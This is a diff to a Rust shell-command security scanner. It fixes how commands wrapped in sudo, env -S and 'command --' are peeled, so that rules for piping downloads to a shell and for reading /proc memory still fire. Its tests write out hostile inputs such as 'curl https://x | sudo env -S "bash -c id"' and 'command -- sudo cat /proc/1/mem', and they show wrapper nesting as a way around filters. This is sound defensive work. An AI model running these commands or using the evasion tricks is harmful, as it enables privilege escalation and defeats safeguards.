@@ -50,6 +50,35 @@ pub const INTERPRETERS: &[&str] = &[
 /// [`resolve_with_parser`].
 const MAX_WRAPPER_DEPTH: usize = 32;
 
+/// `sudo` flags that consume a following value (so the next arg is NOT the
+/// command). Single source of truth shared by every sudo flag-skip
+/// ([`resolve_base_sudo`], [`unwrap_one_wrapper_segment`]).
+const SUDO_VALUE_SHORT_FLAGS: &[&str] = &["-u", "-g", "-C", "-D", "-R", "-T"];
+const SUDO_VALUE_LONG_FLAGS: &[&str] = &[
+    "--user",
+    "--group",
+    "--close-from",
+    "--chdir",
+    "--role",
+    "--type",
+    "--other-user",
+    "--host",
+    "--timeout",
+];
+
+/// `env` flags that consume a following value. `-S` / `--split-string` are
+/// handled separately (their value is a command string, not a positional).
+/// Shared by [`resolve_base_env`] and [`unwrap_one_wrapper_segment`].
+const ENV_VALUE_SHORT_FLAGS: &[&str] = &["-u", "-C"];
+const ENV_VALUE_LONG_FLAGS: &[&str] = &[
+    "--unset",
+    "--chdir",
+    "--split-string",
+    "--block-signal",
+    "--default-signal",
+    "--ignore-signal",
+];
+
 /// Parse up to `max_digits` from `chars[*i..]` matching `predicate`, interpret as
 /// base-`radix`, and return the corresponding char. Advances `*i` past consumed digits.
 /// Zero heap allocations — uses a fixed stack buffer.
@@ -624,29 +653,147 @@ fn command_string_chain_contains_sudo(command: &str, shell: ShellType, depth: us
         .any(|seg| segment_chain_contains_sudo(seg, shell, depth - 1))
 }
 
+/// Index of the first *positional* token (the wrapped command) in a wrapper's
+/// arg list, after skipping that wrapper's option flags / `VAR=VALUE`
+/// assignments and honoring `--`. Returns `None` when the wrapper carries no
+/// positional command, or when the wrapper is an `env` *split-string* form
+/// (`-S` / `--split-string`) — those pack the command into a quoted value and
+/// are peeled by [`unwrap_env_split_string_segment`], not by positional slicing.
+///
+/// Shares the sudo/env flag tables ([`SUDO_VALUE_*`], [`ENV_VALUE_*`]) with the
+/// base resolvers so flag semantics cannot drift between the two peel paths.
+fn wrapper_first_positional_index(
+    wrapper: &str,
+    args: &[String],
+    shell: ShellType,
+) -> Option<usize> {
+    let (value_short, value_long): (&[&str], &[&str]) = match wrapper {
+        "sudo" => (SUDO_VALUE_SHORT_FLAGS, SUDO_VALUE_LONG_FLAGS),
+        "env" => (ENV_VALUE_SHORT_FLAGS, ENV_VALUE_LONG_FLAGS),
+        "exec" => (&["-a"], &[]),
+        // command / nohup take no value-bearing flags.
+        _ => (&[], &[]),
+    };
+    let is_env = wrapper == "env";
+
+    let mut idx = 0;
+    while idx < args.len() {
+        let normalized = normalize_shell_token(args[idx].trim(), shell);
+        if normalized == "--" {
+            // Everything after `--` is the command; first such token is positional.
+            return (idx + 1 < args.len()).then_some(idx + 1);
+        }
+        // env split-string: not a positional command — defer to the env-S peeler.
+        if is_env && (normalized == "-S" || normalized == "--split-string") {
+            return None;
+        }
+        if is_env && normalized.starts_with("--split-string=") {
+            return None;
+        }
+        if normalized.starts_with("--") {
+            if value_long.iter().any(|f| normalized == *f) {
+                idx += 2;
+            } else {
+                idx += 1;
+            }
+            continue;
+        }
+        if normalized.starts_with('-') && normalized != "-" {
+            if value_short.iter().any(|f| normalized == *f)
+                // sudo combined short flags (e.g. `-iu`): last letter may take a value.
+                || (wrapper == "sudo"
+                    && normalized.len() > 2
+                    && value_short.iter().any(|f| normalized.ends_with(&f[1..])))
+            {
+                idx += 2;
+            } else {
+                idx += 1;
+            }
+            continue;
+        }
+        // env VAR=VALUE assignments precede the command.
+        if is_env && normalized.contains('=') {
+            idx += 1;
+            continue;
+        }
+        return Some(idx);
+    }
+    None
+}
+
+/// Peel ONE wrapper layer from `seg`, returning the inner command as a synthetic
+/// [`tokenize::Segment`] (the wrapped command + its args). Handles the generic
+/// wrappers (`sudo`/`env`/`command`/`exec`/`nohup`) via positional slicing and
+/// the `env -S` / `--split-string` split-string form via
+/// [`unwrap_env_split_string_segment`]. Returns `None` when `seg` is not a
+/// wrapper (or carries no inner command).
+///
+/// Used by [`resolve_interpreter_name`]'s bounded peel loop so that an
+/// `env -S "…"` nested BEHIND another wrapper (`sudo env -S "sudo bash -c id"`)
+/// is reached and its payload's own wrapper chain resolved — the single env-S
+/// peel alone never fired because the leading segment was `sudo`, not `env`
+/// (CodeRabbit M13 round-21 F2).
+fn unwrap_one_wrapper_segment(
+    seg: &tokenize::Segment,
+    shell: ShellType,
+) -> Option<tokenize::Segment> {
+    let cmd = seg.command.as_ref()?;
+    let cmd_base = normalize_cmd_base(cmd, shell);
+
+    // env split-string form is peeled to its payload's leading segment.
+    if cmd_base == "env" {
+        if let Some(inner) = unwrap_env_split_string_segment(seg, shell) {
+            return Some(inner);
+        }
+    }
+
+    if !matches!(
+        cmd_base.as_str(),
+        "sudo" | "env" | "command" | "exec" | "nohup"
+    ) {
+        return None;
+    }
+
+    let p = wrapper_first_positional_index(&cmd_base, &seg.args, shell)?;
+    let inner_cmd = seg.args.get(p)?;
+    let inner_args = seg.args[p + 1..].to_vec();
+    Some(tokenize::Segment {
+        raw: seg.args[p..].join(" "),
+        command: Some(inner_cmd.clone()),
+        args: inner_args,
+        preceding_separator: None,
+        byte_range: 0..0,
+    })
+}
+
 /// Resolve the effective interpreter from a segment, handling all quoting forms,
 /// wrappers (sudo, env, command, exec, nohup), subshells, and brace groups.
 fn resolve_interpreter_name(seg: &tokenize::Segment, shell: ShellType) -> Option<String> {
-    // Unwrap an `env -S "…"` / `env --split-string=…` segment so a wrapped
-    // interpreter (`env -S "sudo bash -c id"`) resolves to its real leader
-    // (`bash`) for EVERY caller — the built-in `CurlPipeShell`/`PipeToInterpreter`
-    // / base64-pipe detectors and the custom-rule DSL pipeline-fact extractor
-    // alike. Without this, the split-string body sits inside a single quoted arg
-    // and `resolve_env_args` stops at the leading `sudo`, missing the inner
-    // interpreter (CodeRabbit M13 finding R9-3).
+    // Peel wrapper layers so a wrapped interpreter resolves to its real leader
+    // for EVERY caller — the built-in `CurlPipeShell`/`PipeToInterpreter` /
+    // base64-pipe detectors and the custom-rule DSL pipeline-fact extractor alike.
     //
-    // Unwrap REPEATEDLY: a nested payload like `env -S "env -S 'sudo bash -c id'"`
-    // needs every env-split layer peeled before the leader walk runs, or the inner
-    // interpreter is missed (CodeRabbit M13 round-20). The loop is BOUNDED by the
-    // same `MAX_WRAPPER_DEPTH` budget the wrapper-chain resolvers use, so an
-    // absurdly-nested split-string payload cannot spin unbounded (it would
-    // otherwise reintroduce the round-13 DoS). Falls through to the raw `seg`
-    // when it is not (or no longer) an env-split form.
+    // [`unwrap_one_wrapper_segment`] peels ONE layer per iteration, handling BOTH
+    // the `env -S "…"` / `--split-string=…` split-string form (so
+    // `env -S "sudo bash -c id"` resolves to `bash`, not the leading `sudo` —
+    // CodeRabbit M13 R9-3) AND a generic `sudo`/`env`/`command`/`exec`/`nohup`
+    // wrapper. Peeling generic wrappers here (not just env-S) is what lets an
+    // `env -S "…"` nested BEHIND another wrapper be reached: `sudo env -S
+    // "sudo bash -c id"` peels `sudo` → `env -S "…"` → `sudo bash …` → `bash`
+    // (CodeRabbit M13 round-21 F2). Without it the loop saw a `sudo` leader,
+    // never peeled the inner env-S, and `resolve_env_args` missed the wrapped
+    // interpreter.
+    //
+    // The loop is BOUNDED by the same `MAX_WRAPPER_DEPTH` budget the wrapper-chain
+    // resolvers use (one decrement per peel), so an absurdly-nested chain — env-S
+    // or generic — cannot spin unbounded (it would otherwise reintroduce the
+    // round-13 DoS / round-20 nested-env-S blowup). Falls through to the raw
+    // `seg` when no further wrapper layer can be peeled.
     let mut current: Option<tokenize::Segment> = None;
     let mut budget = MAX_WRAPPER_DEPTH;
     while budget > 0 {
         let probe = current.as_ref().unwrap_or(seg);
-        match unwrap_env_split_string_segment(probe, shell) {
+        match unwrap_one_wrapper_segment(probe, shell) {
             Some(inner) => current = Some(inner),
             None => break,
         }
@@ -723,31 +870,48 @@ fn resolve_base_through_wrappers_depth(
     }
 }
 
+/// Resolve the base command from a positional arg list whose FIRST element is
+/// the command to run (the rest are its args). If that command is itself a
+/// wrapper (`sudo`/`env`/`command`/`exec`/`nohup`), recurse into it so the chain
+/// keeps peeling; otherwise the first element IS the base.
+///
+/// This is the shared tail used by every base resolver after it has skipped the
+/// wrapper's own flags, AND by the end-of-options (`--`) branch — the token
+/// after `--` is the command to run, which may itself be another wrapper, so it
+/// must be resolved through this same recursion rather than returned verbatim
+/// (CodeRabbit M13 round-21 F1: `command -- sudo cat /proc/1/mem` was reported
+/// as `sudo`, hiding the real `cat`). The `depth` budget is shared with the
+/// caller and decrements on every wrapper peel, so a `command -- command -- …`
+/// chain terminates at [`MAX_WRAPPER_DEPTH`] instead of recursing unbounded.
+fn resolve_base_from_positional(args: &[String], shell: ShellType, depth: usize) -> Option<String> {
+    if depth == 0 {
+        return None;
+    }
+    let first = args.first()?;
+    let base = normalize_cmd_base(first, shell);
+    match base.as_str() {
+        "sudo" => resolve_base_sudo(&args[1..], shell, depth - 1),
+        "env" => resolve_base_env(&args[1..], shell, depth - 1),
+        "command" | "exec" | "nohup" => resolve_base_wrapper(&args[1..], &base, shell, depth - 1),
+        _ => Some(base),
+    }
+}
+
 /// Resolve base command through sudo wrapper.
 fn resolve_base_sudo(args: &[String], shell: ShellType, depth: usize) -> Option<String> {
     if depth == 0 {
         return None;
     }
-    let value_short_flags = ["-u", "-g", "-C", "-D", "-R", "-T"];
-    let value_long_flags = [
-        "--user",
-        "--group",
-        "--close-from",
-        "--chdir",
-        "--role",
-        "--type",
-        "--other-user",
-        "--host",
-        "--timeout",
-    ];
+    let value_short_flags = SUDO_VALUE_SHORT_FLAGS;
+    let value_long_flags = SUDO_VALUE_LONG_FLAGS;
     let mut idx = 0;
     while idx < args.len() {
         let normalized = normalize_shell_token(args[idx].trim(), shell);
         if normalized == "--" {
-            if idx + 1 < args.len() {
-                return Some(normalize_cmd_base(&args[idx + 1], shell));
-            }
-            return None;
+            // The token after `--` is the command to run; resolve its own
+            // wrapper chain (it may be `sudo`/`env`/`command …`) rather than
+            // returning it verbatim (round-21 F1).
+            return resolve_base_from_positional(&args[idx + 1..], shell, depth);
         }
         if normalized.starts_with("--") {
             if value_long_flags.iter().any(|f| normalized == *f) {
@@ -771,15 +935,7 @@ fn resolve_base_sudo(args: &[String], shell: ShellType, depth: usize) -> Option<
             continue;
         }
         // First positional is the command — recurse so nested sudo/env/etc still resolves.
-        let base = normalize_cmd_base(&args[idx], shell);
-        return match base.as_str() {
-            "sudo" => resolve_base_sudo(&args[idx + 1..], shell, depth - 1),
-            "env" => resolve_base_env(&args[idx + 1..], shell, depth - 1),
-            "command" | "exec" | "nohup" => {
-                resolve_base_wrapper(&args[idx + 1..], &base, shell, depth - 1)
-            }
-            _ => Some(base),
-        };
+        return resolve_base_from_positional(&args[idx..], shell, depth);
     }
     None
 }
@@ -789,23 +945,15 @@ fn resolve_base_env(args: &[String], shell: ShellType, depth: usize) -> Option<S
     if depth == 0 {
         return None;
     }
-    let value_short_flags = ["-u", "-C"];
-    let value_long_flags = [
-        "--unset",
-        "--chdir",
-        "--split-string",
-        "--block-signal",
-        "--default-signal",
-        "--ignore-signal",
-    ];
+    let value_short_flags = ENV_VALUE_SHORT_FLAGS;
+    let value_long_flags = ENV_VALUE_LONG_FLAGS;
     let mut idx = 0;
     while idx < args.len() {
         let normalized = normalize_shell_token(args[idx].trim(), shell);
         if normalized == "--" {
-            if idx + 1 < args.len() {
-                return Some(normalize_cmd_base(&args[idx + 1], shell));
-            }
-            return None;
+            // `env -- cmd …`: the token after `--` is the command to run; resolve
+            // its own wrapper chain rather than returning it verbatim (round-21 F1).
+            return resolve_base_from_positional(&args[idx + 1..], shell, depth);
         }
         if normalized.starts_with("--") {
             if normalized == "--split-string" {
@@ -843,15 +991,8 @@ fn resolve_base_env(args: &[String], shell: ShellType, depth: usize) -> Option<S
             idx += 1;
             continue;
         }
-        let base = normalize_cmd_base(&args[idx], shell);
-        return match base.as_str() {
-            "sudo" => resolve_base_sudo(&args[idx + 1..], shell, depth - 1),
-            "env" => resolve_base_env(&args[idx + 1..], shell, depth - 1),
-            "command" | "exec" | "nohup" => {
-                resolve_base_wrapper(&args[idx + 1..], &base, shell, depth - 1)
-            }
-            _ => Some(base),
-        };
+        // First positional is the command — recurse so nested sudo/env/etc still resolves.
+        return resolve_base_from_positional(&args[idx..], shell, depth);
     }
     None
 }
@@ -960,10 +1101,10 @@ fn resolve_base_wrapper(
     while idx < args.len() {
         let normalized = normalize_shell_token(args[idx].trim(), shell);
         if normalized == "--" {
-            if idx + 1 < args.len() {
-                return Some(normalize_cmd_base(&args[idx + 1], shell));
-            }
-            return None;
+            // `command/exec/nohup -- cmd …`: the token after `--` is the command
+            // to run; resolve its own wrapper chain rather than returning it
+            // verbatim (round-21 F1).
+            return resolve_base_from_positional(&args[idx + 1..], shell, depth);
         }
         if normalized.starts_with("--") || normalized.starts_with('-') {
             if value_flags.iter().any(|f| normalized == *f) {
@@ -973,15 +1114,8 @@ fn resolve_base_wrapper(
             }
             continue;
         }
-        let base = normalize_cmd_base(&args[idx], shell);
-        return match base.as_str() {
-            "sudo" => resolve_base_sudo(&args[idx + 1..], shell, depth - 1),
-            "env" => resolve_base_env(&args[idx + 1..], shell, depth - 1),
-            "command" | "exec" | "nohup" => {
-                resolve_base_wrapper(&args[idx + 1..], &base, shell, depth - 1)
-            }
-            _ => Some(base),
-        };
+        // First positional is the command — recurse so nested sudo/env/etc still resolves.
+        return resolve_base_from_positional(&args[idx..], shell, depth);
     }
     None
 }
@@ -2967,6 +3101,74 @@ mod tests {
     }
 
     #[test]
+    fn test_base_resolvers_peel_through_dashdash_terminator() {
+        // CodeRabbit M13 round-21 F1: the end-of-options `--` token used to stop
+        // wrapper unwrapping — the base resolvers returned the IMMEDIATELY-following
+        // token verbatim. But that token is itself the command to run and may be
+        // ANOTHER wrapper, so a chain hidden behind `--` evaded resolution
+        // (`command -- sudo cat /proc/PID/mem` resolved to `sudo`, not `cat`). The
+        // `--` branch now resolves the post-`--` remainder through the SAME
+        // wrapper-peel recursion (sharing the `MAX_WRAPPER_DEPTH` budget).
+
+        // (1) /proc/*/mem privesc hidden behind `command -- sudo`: must still be
+        // detected. Before the fix the base resolved to `sudo` (not in
+        // PROC_MEM_READER_CMDS), so ProcMemAccess never fired.
+        for input in [
+            "command -- sudo cat /proc/1/mem", // command -- sudo cat …
+            "command -- env cat /proc/1/mem",  // command -- env cat …
+            "sudo -- env cat /proc/1/mem",     // sudo -- env cat … (env after --)
+            "env -- sudo cat /proc/1/mem",     // env -- sudo cat … (sudo after --)
+            "command -- command -- sudo cat /proc/1/mem", // doubled `--`
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings.iter().any(|f| f.rule_id == RuleId::ProcMemAccess),
+                "proc-mem read with a wrapper chain behind `--` must be detected: {input:?}"
+            );
+        }
+        // Direct base-resolver coverage: the post-`--` wrapper chain peels to `cat`.
+        for input in [
+            "command -- sudo cat /proc/1/mem",
+            "command -- command -- sudo cat /proc/1/mem",
+        ] {
+            let segs = tokenize::tokenize(input, ShellType::Posix);
+            assert_eq!(
+                resolve_base_through_wrappers(&segs[0], ShellType::Posix),
+                "cat",
+                "wrapper chain behind `--` must resolve to the real base: {input:?}"
+            );
+        }
+
+        // (2) A pipeline RHS `command -- env -S "bash -c id"` must resolve its
+        // interpreter to `bash` and fire CurlPipeShell/PipeToInterpreter — the
+        // post-`--` token is `env -S "…"`, another wrapper.
+        let pipe = r#"curl https://x | command -- env -S "bash -c id""#;
+        let findings = check_default(pipe, ShellType::Posix);
+        assert!(
+            findings
+                .iter()
+                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
+            "interpreter behind `command -- env -S` must reach the pipe rule: {pipe:?}"
+        );
+        assert!(
+            extract_command_facts(pipe, ShellType::Posix)
+                .pipeline_targets
+                .iter()
+                .any(|t| t == "bash"),
+            "pipeline target behind `command -- env -S` must resolve to bash"
+        );
+
+        // (3) BUDGET GUARD: a `command -- command -- … sudo …` chain nested FAR
+        // past MAX_WRAPPER_DEPTH must terminate (the post-`--` recursion shares the
+        // bounded budget, no new unbounded recursion). The point is the call
+        // RETURNS without overflowing; the value at exhaustion is unspecified.
+        let deep = "command -- ".repeat(5000) + "sudo cat /proc/self/mem";
+        let _ = check_default(&deep, ShellType::Posix);
+        let segs = tokenize::tokenize(&deep, ShellType::Posix);
+        let _ = resolve_base_through_wrappers(&segs[0], ShellType::Posix);
+    }
+
+    #[test]
     fn test_facts_uses_sudo_env_split_string_payload_uses_wrapper_parser() {
         // CodeRabbit M13 round-15 R15-3: the `env -S "…"` payload is now run back
         // through the SAME wrapper-chain resolution as the rest of the file (each
@@ -3226,6 +3428,108 @@ mod tests {
         let inner = "env -S ".repeat(500) + "bash -c id";
         let deep = format!("env -S '{inner}'");
         let segs = tokenize::tokenize(&deep, ShellType::Posix);
+        let _ = resolve_interpreter_name(&segs[0], ShellType::Posix);
+    }
+
+    #[test]
+    fn test_resolve_interpreter_name_peels_env_split_string_behind_wrapper() {
+        // CodeRabbit M13 round-21 F2: `resolve_interpreter_name`'s peel loop used
+        // to apply `unwrap_env_split_string_segment` ONLY when the current segment
+        // was ITSELF an `env -S` form. So an env-S nested BEHIND another wrapper
+        // (`sudo env -S "…"`, `command env -S "…"`) was never peeled, and when its
+        // payload carried its OWN wrapper chain (e.g. `sudo bash`), the inner
+        // interpreter was missed: the leader walk's `resolve_env_args` saw
+        // `normalize_cmd_base("sudo bash …") == "sudo"`, not an interpreter, and
+        // gave up. The loop now peels generic wrappers AND env-S in the same
+        // bounded pass, so the inner interpreter is exposed.
+        let resolve_last = |input: &str| {
+            let segs = tokenize::tokenize(input, ShellType::Posix);
+            resolve_interpreter_name(segs.last().unwrap(), ShellType::Posix)
+        };
+
+        // (1) Real pipe path: `curl … | sudo env -S "bash -c id"` resolves the
+        // interpreter to `bash`, so pipeline_targets contains `bash`, uses_sudo is
+        // true, and CurlPipeShell/PipeToInterpreter fires.
+        let pipe = r#"curl https://x | sudo env -S "bash -c id""#;
+        let findings = check_default(pipe, ShellType::Posix);
+        assert!(
+            findings
+                .iter()
+                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
+            "env -S behind sudo must reach the pipe-to-interpreter rule: {pipe:?}"
+        );
+        let facts = extract_command_facts(pipe, ShellType::Posix);
+        assert!(
+            facts.pipeline_targets.iter().any(|t| t == "bash"),
+            "pipeline target for `sudo env -S \"bash …\"` must be bash (got {:?})",
+            facts.pipeline_targets
+        );
+        assert!(
+            facts.uses_sudo,
+            "the leading sudo in `sudo env -S \"bash …\"` must be detected: {pipe:?}"
+        );
+
+        // (2) A wrapper-then-env-S-then-NESTED-env-S composition resolves correctly:
+        // peel sudo → env -S → (payload's own env -S) → bash.
+        for input in [
+            r#"sudo env -S "bash -c id""#,               // sudo → env -S → bash
+            r#"command env -S "bash -c id""#,            // command → env -S → bash
+            r#"sudo env -S "sudo bash -c id""#,          // sudo → env -S → sudo bash → bash
+            r#"command env -S "sudo bash -c id""#,       // command → env -S → sudo bash → bash
+            r#"sudo env -S "env -S 'bash -c id'""#,      // sudo → env -S → (env -S) → bash
+            r#"sudo env -S "env -S 'sudo bash -c id'""#, // sudo → env -S → (env -S → sudo bash) → bash
+        ] {
+            let segs = tokenize::tokenize(input, ShellType::Posix);
+            assert_eq!(
+                resolve_interpreter_name(&segs[0], ShellType::Posix).as_deref(),
+                Some("bash"),
+                "env -S behind a wrapper must resolve to the inner interpreter: {input:?}"
+            );
+        }
+        // Same compositions on a pipeline RHS resolve their target to bash.
+        for input in [
+            r#"curl https://x | command env -S "sudo bash -c id""#,
+            r#"curl https://x | sudo env -S "env -S 'bash -c id'""#,
+        ] {
+            assert_eq!(
+                resolve_last(input).as_deref(),
+                Some("bash"),
+                "pipeline RHS env -S behind a wrapper must resolve to bash: {input:?}"
+            );
+        }
+
+        // (3) REGRESSION GUARD: the round-20 DIRECT nested `env -S "env -S '…'"`
+        // form (no leading generic wrapper) still resolves to bash, and plain forms
+        // are unchanged.
+        let resolve = |input: &str| {
+            let segs = tokenize::tokenize(input, ShellType::Posix);
+            resolve_interpreter_name(&segs[0], ShellType::Posix)
+        };
+        assert_eq!(
+            resolve(r#"env -S "env -S 'sudo bash -c id'""#).as_deref(),
+            Some("bash"),
+            "round-20 direct nested env -S must still resolve to bash"
+        );
+        assert_eq!(
+            resolve(r#"env -S "sudo bash -c id""#).as_deref(),
+            Some("bash")
+        );
+        assert_eq!(resolve("bash -c id").as_deref(), Some("bash"));
+        assert_eq!(resolve("env bash -c id").as_deref(), Some("bash"));
+        assert_eq!(resolve("sudo bash -c id").as_deref(), Some("bash"));
+        // A non-interpreter behind the same wrappers must stay unresolved (None).
+        assert_eq!(resolve(r#"sudo env -S "apt install x""#), None);
+
+        // (4) BUDGET GUARD: a wrapper-prefixed, deeply-composed chain nested FAR
+        // past MAX_WRAPPER_DEPTH must terminate (generic + env-S peels share the one
+        // bounded budget — no second unbounded loop). The call must RETURN; the
+        // value at exhaustion is unspecified.
+        let deep_generic = "sudo ".repeat(5000) + "bash -c id";
+        let segs = tokenize::tokenize(&deep_generic, ShellType::Posix);
+        let _ = resolve_interpreter_name(&segs[0], ShellType::Posix);
+        let inner = "env -S ".repeat(400) + "sudo bash -c id";
+        let deep_composed = format!(r#"sudo env -S "{inner}""#);
+        let segs = tokenize::tokenize(&deep_composed, ShellType::Posix);
         let _ = resolve_interpreter_name(&segs[0], ShellType::Posix);
     }
 
